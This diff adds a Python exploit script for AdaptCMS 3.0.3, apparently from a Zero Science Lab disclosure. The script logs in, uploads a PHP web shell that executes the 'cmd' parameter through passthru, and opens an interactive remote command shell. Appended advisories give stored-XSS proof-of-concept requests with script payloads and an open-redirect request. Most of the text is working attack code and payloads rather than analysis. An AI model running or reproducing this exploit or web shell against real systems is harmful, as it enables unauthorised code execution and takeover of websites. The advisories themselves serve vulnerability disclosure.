@@ -1,0 +1,436 @@
+#!/usr/bin/env python
+#
+#
+# AdaptCMS 3.0.3 Remote Command Execution Exploit
+#
+#
+# Vendor: Insane Visions
+# Product web page: http://www.adaptcms.com
+# Affected version: 3.0.3
+#
+# Summary: AdaptCMS is a Content Management System trying
+# to be both simple and easy to use, as well as very agile
+# and extendable. Not only so we can easily create Plugins 
+# or additions, but so other developers can get involved.
+# Using CakePHP we are able to achieve this with a built-in
+# plugin system and MVC setup, allowing us to focus on the
+# details and end-users to focus on building their website
+# to look and feel great.
+#
+# Desc: AdaptCMS suffers from an authenticated arbitrary
+# command execution vulnerability. The issue is caused due
+# to the improper verification of uploaded files. This can
+# be exploited to execute arbitrary PHP code by creating
+# or uploading a malicious PHP script file that will be
+# stored in '\app\webroot\uploads' directory.
+#
+# Tested on: Apache 2.4.10 (Win32)
+#            PHP 5.6.3
+#            MySQL 5.6.21
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2015-5220
+# Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2015-5220.php
+#
+#
+# 29.12.2014
+#
+#
+
+
+import itertools, mimetools, mimetypes, os
+import cookielib, urllib, urllib2, sys, re
+
+from cStringIO import StringIO
+from urllib2 import URLError
+
+piton = os.path.basename(sys.argv[0])
+
+def bannerche():
+	print """
+ o==========================================o
+ |                                          |
+ |        AdaptCMS RCE Exploit              |
+ |                                          |
+ |                        ID:ZSL-2015-5220  |
+ |  o/                                      |
+ +------------------------------------------+
+		"""
+	if len(sys.argv) < 3:
+		print '\x20\x20[*] Usage: '+piton+' <hostname> <pathname>'
+		print '\x20\x20[*] Example: '+piton+' zeroscience.mk adaptcms\n'
+		sys.exit()
+
+bannerche()
+
+host = sys.argv[1]
+path = sys.argv[2]
+
+cj = cookielib.CookieJar()
+opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+
+try:
+	gettokens = opener.open('http://'+host+'/'+path+'/login')
+except urllib2.HTTPError, errorzio:
+	if errorzio.code == 404:
+		print 'Path error.'
+		sys.exit()
+except URLError, errorziocvaj:
+	if errorziocvaj.reason:
+		print 'Hostname error.'
+		sys.exit()
+
+print '\x20\x20[*] Login please.'
+
+tokenfields = re.search('fields]" value="(.+?)" id=', gettokens.read()).group(1)
+gettokens = opener.open('http://'+host+'/'+path+'/login')
+tokenkey = re.search('key]" value="(.+?)" id=', gettokens.read()).group(1)
+
+username = raw_input('\x20\x20[*] Enter username: ')
+password = raw_input('\x20\x20[*] Enter password: ')
+
+login_data = urllib.urlencode({
+							'_method' : 'POST',
+							'data[User][username]' : username,
+							'data[User][password]' : password,
+							'data[_Token][fields]' : '864206fbf949830ca94401a65660278ae7d065b3%3A',
+							'data[_Token][key]' : tokenkey,
+							'data[_Token][unlocked]' : ''
+							})
+
+login = opener.open('http://'+host+'/'+path+'/login', login_data)
+auth = login.read()
+for session in cj:
+	sessid = session.name
+
+ses_chk = re.search(r'%s=\w+' % sessid , str(cj))
+cookie = ses_chk.group(0)
+print '\x20\x20[*] Accessing...'
+
+upload = opener.open('http://'+host+'/'+path+'/admin/files/add')
+filetoken = re.search('key]" value="(.+?)" id=', upload.read()).group(1)
+
+class MultiPartForm(object):
+
+    def __init__(self):
+        self.form_fields = []
+        self.files = []
+        self.boundary = mimetools.choose_boundary()
+        return
+    
+    def get_content_type(self):
+        return 'multipart/form-data; boundary=%s' % self.boundary
+
+    def add_field(self, name, value):
+        self.form_fields.append((name, value))
+        return
+
+    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
+        body = fileHandle.read()
+        if mimetype is None:
+            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
+        self.files.append((fieldname, filename, mimetype, body))
+        return
+    
+    def __str__(self):
+
+        parts = []
+        part_boundary = '--' + self.boundary
+        
+        parts.extend(
+            [ part_boundary,
+              'Content-Disposition: form-data; name="%s"' % name,
+              '',
+              value,
+            ]
+            for name, value in self.form_fields
+            )
+        
+        parts.extend(
+            [ part_boundary,
+              'Content-Disposition: file; name="%s"; filename="%s"' % \
+                 (field_name, filename),
+              'Content-Type: %s' % content_type,
+              '',
+              body,
+            ]
+            for field_name, filename, content_type, body in self.files
+            )
+        
+        flattened = list(itertools.chain(*parts))
+        flattened.append('--' + self.boundary + '--')
+        flattened.append('')
+        return '\r\n'.join(flattened)
+
+if __name__ == '__main__':
+
+    form = MultiPartForm()
+    form.add_field('_method', 'POST')
+    form.add_field('data[_Token][key]', filetoken)
+    form.add_field('data[File][type]', 'edit')
+    form.add_field('data[0][File][filename]', '')
+    form.add_field('data[0][File][dir]', 'uploads/')
+    form.add_field('data[0][File][mimetype]', '')
+    form.add_field('data[0][File][filesize]', '')
+    form.add_field('data[File][content]', '<?php echo "<pre>"; passthru($_GET[\'cmd\']); echo "</pre>"; ?>')
+    form.add_field('data[File][file_extension]', 'php')
+    form.add_field('data[File][file_name]', 'thricer')
+    form.add_field('data[File][caption]', 'THESHELL')
+    form.add_field('data[File][dir]', 'uploads/')
+    form.add_field('data[0][File][caption]', '')
+    form.add_field('data[0][File][watermark]', '0')
+    form.add_field('data[0][File][zoom]', 'C')
+    form.add_field('data[File][resize_width]', '')
+    form.add_field('data[File][resize_height]', '')
+    form.add_field('data[0][File][random_filename]', '0')
+    form.add_field('data[File][library]', '')
+    form.add_field('data[_Token][fields]', '0e50b5f22866de5e6f3b959ace9768ea7a63ff3c%3A0.File.dir%7C0.File.filesize%7C0.File.mimetype%7CFile.dir')
+    form.add_file('data[0][File][filename]', 'filename', fileHandle=StringIO(''))
+
+    request = urllib2.Request('http://'+host+'/'+path+'/admin/files/add')
+    request.add_header('User-agent', 'joxypoxy 6.0')
+    body = str(form)
+    request.add_header('Content-type', form.get_content_type())
+    request.add_header('Cookie', cookie)
+    request.add_header('Content-length', len(body))
+    request.add_data(body)
+    request.get_data()
+    urllib2.urlopen(request).read()
+
+f_loc = '/uploads/thricer.php'
+print
+
+while True:
+	try:
+		cmd = raw_input('shell@'+host+':~# ')
+		execute = opener.open('http://'+host+'/'+path+f_loc+'?cmd='+urllib.quote(cmd))
+		reverse = execute.read()
+		pattern = re.compile(r'<pre>(.*?)</pre>',re.S|re.M)
+		cmdout = pattern.match(reverse)
+		print cmdout.groups()[0].strip()
+		print
+		if cmd.strip() == 'exit':
+			break
+	except Exception:
+		break
+
+print 'Session terminated.\n'
+
+sys.exit()
+
+"""
+###############################################################################
+
+AdaptCMS 3.0.3 Multiple Persistent XSS Vulnerabilities
+
+
+Vendor: Insane Visions
+Product web page: http://www.adaptcms.com
+Affected version: 3.0.3
+
+Summary: AdaptCMS is a Content Management System trying
+to be both simple and easy to use, as well as very agile
+and extendable. Not only so we can easily create Plugins 
+or additions, but so other developers can get involved.
+Using CakePHP we are able to achieve this with a built-in
+plugin system and MVC setup, allowing us to focus on the
+details and end-users to focus on building their website
+to look and feel great.
+
+Desc: AdaptCMS version 3.0.3 suffers from multiple stored
+cross-site scripting vulnerabilities. Input passed to several
+POST parameters is not properly sanitised before being returned
+to the user. This can be exploited to execute arbitrary HTML
+and script code in a user's browser session in context of an
+affected site.
+
+Tested on: Apache 2.4.10 (Win32)
+           PHP 5.6.3
+           MySQL 5.6.21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5218
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5218.php
+
+
+29.12.2014
+
+--
+
+
+==========================================
+ #1 Stored XSS
+    POST parameter: data[Category][title]
+------------------------------------------
+
+POST /adaptcms/admin/categories/add HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/adaptcms/admin/categories/add
+Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 279
+
+_method=POST&data%5B_Token%5D%5Bkey%5D=851f8e2e973800b2b0635d5157c55369bcade604&data%5BCategory%5D%5Btitle%5D=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&data%5B_Token%5D%5Bfields%5D=14d1551ece2201712436bf482f7e776f422a7966%253A&data%5B_Token%5D%5Bunlocked%5D=
+
+
+=======================================
+ #2 Stored XSS
+    POST parameter: data[Field][title]
+---------------------------------------
+
+POST /adaptcms/admin/fields/ajax_fields/ HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost/adaptcms/admin/fields/add
+Content-Length: 141
+Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+data%5BField%5D%5Bcategory_id%5D=2&data%5BField%5D%5Btitle%5D=%22%3E%3Cscript%3Ealert(2)%3B%3C%2Fscript%3E&data%5BField%5D%5Bdescription%5D=
+
+
+=========================
+ #3 Stored XSS
+    POST parameter: name
+-------------------------
+
+POST /adaptcms/admin/tools/create_theme?finish=true HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=utf-8
+Referer: http://localhost/adaptcms/admin/tools/create_theme
+Content-Length: 242
+Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+{"basicInfo":{"name":"\"><script>alert(3);</script>","block_active":"","is_fields":"","is_searchable":""},"versions":{"current_version":"1.0","versions":["1.0","111"]},"skeleton":{"controller":false,"model":false,"layout":true,"views":false}}
+
+
+===========================================
+ #4 Stored XSS
+    POST parameter: data[Link][link_title]
+-------------------------------------------
+
+POST /adaptcms/admin/links/links/add HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/adaptcms/admin/links/links/add
+Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 593
+
+_method=POST&data%5B_Token%5D%5Bkey%5D=2c5e2f46b5c13a78395b2e79303543cd4d444789&data%5BLink%5D%5Btitle%5D=444&data%5BLink%5D%5Burl%5D=http%3A%2F%2Fzeroscience.mk&data%5BLink%5D%5Blink_title%5D="><script>alert(4);</script>&data%5BLink%5D%5Blink_target%5D=_new&data%5BLink%5D%5Bactive%5D=0&data%5BLink%5D%5Bactive%5D=1&data%5BLink%5D%5Btype%5D=&data%5BLink%5D%5Bimage_url%5D=&data%5BLink%5D%5Bselect_all%5D=0&data%5BLink%5D%5Bselect_none%5D=0&data%5BLink%5D%5Bsort_by%5D=&data%5BLink%5D%5Bsort_direction%5D=&data%5B_Token%5D%5Bfields%5D=34394f00acd7233477b8cd9e681e331f083052a5%253A&data%5B_Token%5D%5Bunlocked%5D=
+
+
+==============================================
+ #5 Stored XSS
+    POST parameter: data[ForumTopic][subject]
+----------------------------------------------
+
+POST /adaptcms/forums/off-topic/new HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/adaptcms/forums/off-topic/new
+Cookie: adaptcms=c4fqklpt7gneokqbbv4iq1e5b1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 460
+
+_method=POST&data%5B_Token%5D%5Bkey%5D=4c5428572b6454152377ae8db2c3a8a753f39dba&data%5BForumTopic%5D%5Bsubject%5D=%22%3E%3Cscript%3Ealert%285%29%3B%3C%2Fscript%3E&data%5BForumTopic%5D%5Bcontent%5D=%3Cp%3Etestingcontent%3C%2Fp%3E&data%5BForumTopic%5D%5Btopic_type%5D=topic&data%5BForumTopic%5D%5Bforum_id%5D=1&data%5B_Token%5D%5Bfields%5D=bcff03f6432e544b05d877fcdd8c29f13155693a%253AForumTopic.forum_id%257CForumTopic.topic_type&data%5B_Token%5D%5Bunlocked%5D=
+
+
+###############################################################################
+
+
+
+AdaptCMS 3.0.3 HTTP Referer Header Field Open Redirect Vulnerability
+
+
+Vendor: Insane Visions
+Product web page: http://www.adaptcms.com
+Affected version: 3.0.3
+
+Summary: AdaptCMS is a Content Management System trying
+to be both simple and easy to use, as well as very agile
+and extendable. Not only so we can easily create Plugins 
+or additions, but so other developers can get involved.
+Using CakePHP we are able to achieve this with a built-in
+plugin system and MVC setup, allowing us to focus on the
+details and end-users to focus on building their website
+to look and feel great.
+
+Desc: Input passed via the 'Referer' header field is not
+properly verified before being used to redirect users.
+This can be exploited to redirect a user to an arbitrary
+website e.g. when a user clicks a specially crafted link
+to the affected script hosted on a trusted domain.
+
+====================================
+\lib\Cake\Controller\Controller.php:
+------------------------------------
+Line: 956
+..
+..
+Line: 974
+------------------------------------
+
+Tested on: Apache 2.4.10 (Win32)
+           PHP 5.6.3
+           MySQL 5.6.21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5219
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5219.php
+
+
+29.12.2014
+
+--
+
+
+GET /adaptcms/admin/adaptbb/webroot/foo HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: adaptcms=uu16dmimdemvcq54h3nevq6oa0
+Connection: keep-alive
+Referer: http://zeroscience.mk
+"""
